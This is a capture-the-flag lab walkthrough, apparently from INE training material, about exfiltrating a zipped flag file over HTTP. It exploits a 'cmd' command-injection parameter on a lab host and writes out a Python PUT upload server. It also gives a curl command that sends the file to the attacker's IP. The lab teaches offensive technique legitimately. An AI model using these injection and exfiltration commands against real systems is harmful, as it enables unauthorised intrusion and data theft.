---
description: >-
  In this lab you will learn how one can use a simple HTTP server written in
  Python for exfiltrating data from a restricted environment.
---

# Lab - Data Exfiltration

## Lab Environment

You have exploited a vulnerable API endpoint and overwritten it with malicious code. This modification allows you to run commands on the server machine hosting the API, as a low privilege user i.e. student. A sensitive flag file is kept in a zipped archive file in the student user's home directory.

Also, there is a monitor process running on the server machine that blocks most protocols except HTTP protocol (when using port 80).

**Objective:** Transfer the zipped archive to your Kali machine using HTTP protocol and retrieve the flag!

**Instructions**

* Once you start the lab, you will have access to the Kali GUI instance
* The API endpoint is accessible at `demo.ine.local` domain!

![](https://assets.ine.com/content/pta-labs/3\_data\_exfiltration/0.png)

## Tools

The tools used in this lab are:

* Nmap
* A web browser
* Python Scripting
* curl

## Solution

Run an nmap scan on demo.ine.local to find out open ports

```
nmap demo.ine.local
```

![](<../../../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

We can see that port 8000 is open

Going to **demo.ine.local** shows us the following

![](<../../../../.gitbook/assets/image (8) (1) (1) (1) (1) (1) (1).png>)

From the "cmd parameter required" response, we know this means we need to pass parameter names cmd with the URL

For example `pwd` or `ls` or `whoami`

```
demo.ine.local:8000?cmd=pwd
```

![](<../../../../.gitbook/assets/image (2) (1) (1) (1) (1).png>)

Here we see the present working directory located on the web-server

Let's see the contents of that directory

```
demo.ine.local:8000?cmd=ls -l
```

![](<../../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1).png>)

We see an interesting file flag.zip. However, in order to retrieve the flag, we need to transfer/exfiltrate this file to our Kali machine

One of the tools mentioned in the beginning was cURL. Let's check if curl is on the remote machine

```
demo.ine.local:8000?cmd=curl -h
```

![](<../../../../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1) (1) (1).png>)

Now that we know the remote machine has curl, let's check what our IP is.

```
ifconfig
```

![](<../../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1).png>)

In order to exfiltrate the flag.zip file, we need to run a HTTP server on our kali machine that can accept and save the file when it is sent over HTTP

This code will help us:

```python
#!/usr/bin/python

import SimpleHTTPServer
import BaseHTTPServer

class SputHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
    def do_PUT(self):
        print self.headers
        length = int(self.headers["Content-Length"])
        path = self.translate_path(self.path)
        with open(path, "wb") as dst:
            dst.write(self.rfile.read(length))

if __name__ == '__main__':
    SimpleHTTPServer.test(HandlerClass=SputHTTPRequestHandler)
```

Next I saved the file as **server.py** and ran it.

```
python server.py 80
```

Now we'll upload the zip file to our HTTP server running on Kali using curl

```
demo.ine.local:8000?cmd=curl+192.147.164.2+--upload-file+flag.zip
```

![](<../../../../.gitbook/assets/image (9) (1) (1) (1) (1) (1) (1) (1).png>)

Here we can see that our server received the file

If we list the contents of our current working directory we'll see the file

![](<../../../../.gitbook/assets/image (7) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png>)

Lastly, unzip the file and retrieve the flag.

```
unzip flag.zip
```

```
cat flag/flag.txt
```

![](<../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png>)
